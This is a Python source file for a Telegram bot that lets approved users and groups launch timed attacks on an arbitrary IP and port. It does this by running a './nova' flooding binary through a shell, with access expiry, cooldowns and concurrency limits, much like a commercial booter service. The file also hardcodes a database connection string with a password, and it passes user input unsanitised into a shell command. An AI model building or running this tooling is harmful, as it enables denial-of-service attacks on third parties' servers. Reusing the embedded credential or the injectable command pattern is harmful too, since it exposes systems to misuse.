import os
import subprocess
import threading
from datetime import datetime, timedelta
from telegram import Update, ParseMode
from telegram.ext import Updater, CommandHandler, CallbackContext
from pymongo import MongoClient

# MongoDB setup
client = MongoClient('mongodb+srv://deepaidb:51354579914@deepaidb.imzonfj.mongodb.net/?retryWrites=true&w=majority&appName=deepaidb')
db = client['zoya']
users_collection = db['approved_users']
groups_collection = db['approved_groups']  # Collection for approved groups
attacks_collection = db['attack_history']

admins = []
active_attacks = {}  # Tracks active attacks per group {group_id: [list of active attacks]}
cooldowns = {}
cooldown_period = timedelta(minutes=5)  # Cooldown of 5 minutes after attack
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list

def is_group_approved(group_id):
    """Check if the group is approved."""
    group = groups_collection.find_one({"_id": group_id})
    return group is not None

def get_max_attacks(group_id):
    """Get the maximum number of allowed concurrent attacks for the group."""
    group = groups_collection.find_one({"_id": group_id})
    return group.get('max_attacks', 1)  # Default max attacks is 1 if not set

def set_max_attacks(update: Update, context: CallbackContext):
    """Admin command to set the maximum number of concurrent attacks in a group."""
    user_id = update.effective_user.id
    chat_id = update.message.chat_id
    
    if user_id in admins:
        try:
            max_attacks = int(context.args[0])
            groups_collection.update_one(
                {"_id": chat_id},
                {"$set": {"max_attacks": max_attacks}},
                upsert=True
            )
            update.message.reply_text(f"✅ Maximum concurrent attacks set to {max_attacks} for this group! 🚀")
        except (IndexError, ValueError):
            update.message.reply_text("⚠️ Usage: /maxattack <number>")
    else:
        update.message.reply_text("🚫 You are not authorized to set the maximum number of attacks!")

def approve_group(update: Update, context: CallbackContext):
    """Admin command to approve a group."""
    user_id = update.effective_user.id
    chat_id = update.message.chat_id
    
    if user_id in admins:
        groups_collection.update_one(
            {"_id": chat_id},
            {"$set": {"approved_date": datetime.now(), "max_attacks": 1}},  # Default max attacks is 1
            upsert=True
        )
        update.message.reply_text(f"✅ Group {chat_id} has been approved! 🎉")
    else:
        update.message.reply_text("🚫 You are not authorized to approve groups!")

def disapprove_group(update: Update, context: CallbackContext):
    """Admin command to disapprove a group."""
    user_id = update.effective_user.id
    chat_id = update.message.chat_id

    if user_id in admins:
        groups_collection.delete_one({"_id": chat_id})
        update.message.reply_text(f"❌ Group {chat_id} has been disapproved.")
    else:
        update.message.reply_text("🚫 You are not authorized to disapprove groups!")

def save_user(user_id, days):
    expires_on = datetime.now() + timedelta(days=days)
    users_collection.update_one(
        {"_id": user_id},
        {"$set": {"approved_date": datetime.now(), "expires_on": expires_on}},
        upsert=True
    )

def is_user_approved(user_id):
    """Check if the user is approved for personal attacks."""
    user = users_collection.find_one({"_id": user_id})
    return user and user['expires_on'] > datetime.now()

def is_user_on_cooldown(user_id):
    """Check if the user is on cooldown."""
    if user_id in cooldowns:
        cooldown_end = cooldowns[user_id]
        if datetime.now() < cooldown_end:
            return True, cooldown_end - datetime.now()
    return False, None

def get_active_attacks_count(chat_id):
    """Get the number of active attacks in a group."""
    return len(active_attacks.get(chat_id, []))  # Return length of active attacks for that group

def attack(update: Update, context: CallbackContext) -> None:
    chat_id = update.message.chat_id
    user_id = update.effective_user.id
    
    # If it's a group chat, check if the group is approved
    if update.message.chat.type in ['group', 'supergroup']:
        if not is_group_approved(chat_id):
            update.message.reply_text("⚠️ This command can only be used in an approved group.")
            return
        
        # Check if the user is a member of the group
        try:
            member = context.bot.get_chat_member(chat_id, user_id)
            if member.status not in ['member', 'administrator', 'creator']:
                update.message.reply_text("🚫 You need to be a group member to attack.")
                return
        except:
            update.message.reply_text("⚠️ Could not verify your membership in the group.")
            return

        # Check the maximum number of concurrent attacks in the group
        max_attacks = get_max_attacks(chat_id)
        if get_active_attacks_count(chat_id) >= max_attacks:
            update.message.reply_text(f"🚫 Maximum number of concurrent attacks ({max_attacks}) reached. Please wait for an ongoing attack to finish.")
            return

    # If it's a private chat, check if the user is approved
    elif update.message.chat.type == 'private':
        if not is_user_approved(user_id):
            update.message.reply_text("🚫 You are not approved to use this command in private.")
            return

    # Check cooldown
    on_cooldown, time_left = is_user_on_cooldown(user_id)
    if on_cooldown:
        minutes_left = int(time_left.total_seconds() // 60)
        seconds_left = int(time_left.total_seconds() % 60)
        update.message.reply_text(
            f"⏳ You are on cooldown! Please wait {minutes_left} minutes and {seconds_left} seconds before starting another attack."
        )
        return

    # Check if there's an active attack for this user (limit this to personal chat only)
    if chat_id in active_attacks and user_id in [a['user_id'] for a in active_attacks[chat_id]]:
        update.message.reply_text("⚔️ You already have an ongoing attack. Please wait for it to finish.")
        return

    try:
        ip = context.args[0]
        port = int(context.args[1])
        duration = int(context.args[2])

        # Check if the port is blocked
        if port in blocked_ports:
            update.message.reply_text(f"🚫 The port {port} is blocked and cannot be used for attacks.")
            return

        # If it's a group attack, limit the duration to 300 seconds
        if update.message.chat.type in ['group', 'supergroup'] and duration > 300:
            duration = 300
            update.message.reply_text("⏳ In group chats, your attack duration is limited to 300 seconds.")

        # Add this attack to the list of active attacks for the group
        if chat_id not in active_attacks:
            active_attacks[chat_id] = []

        # Store active attack details
        attack_data = {
            "user_id": user_id,
            "ip": ip,
            "port": port,
            "duration": duration,
            "message_id": update.message.message_id,
            "chat_id": update.message.chat_id
        }
        active_attacks[chat_id].append(attack_data)

        update.message.reply_text(f"🚀 **Attack STARTED!**\n\n🌐 IP: {ip}\n🔌 PORT: {port}\n⏰ TIME: {duration} seconds", parse_mode=ParseMode.MARKDOWN)

        command = f"./nova {ip} {port} {duration} 10"
        process = subprocess.Popen(command, shell=True)

        def end_attack():
            process.kill()
            active_attacks[chat_id].remove(attack_data)  # Remove the attack from the active list
            update.message.reply_text(f"🏁 **Attack over!**\n\n🌐 IP: {ip}\n🔌 PORT: {port}\n⏰ TIME: {duration} seconds", parse_mode=ParseMode.MARKDOWN)
            # Set cooldown
            cooldowns[user_id] = datetime.now() + cooldown_period

        timer = threading.Timer(duration, end_attack)
        timer.start()

    except (IndexError, ValueError):
        update.message.reply_text("⚠️ Usage: /attack <ip> <port> <time>")

def main():
    # Initialize the updater and dispatcher with your bot token
    updater = Updater("enter bot token", use_context=True)
    dispatcher = updater.dispatcher

    # Command handlers
    dispatcher.add_handler(CommandHandler("attack", attack))
    dispatcher.add_handler(CommandHandler("approve", approve_group))
    dispatcher.add_handler(CommandHandler("disapprove", disapprove_group))
    dispatcher.add_handler(CommandHandler("maxattack", set_max_attacks))  # Command to set max attacks

    # Start polling to receive updates from Telegram
    updater.start_polling()
    
    # Keep the bot running until manually stopped
    updater.idle()

if __name__ == '__main__':
    main()
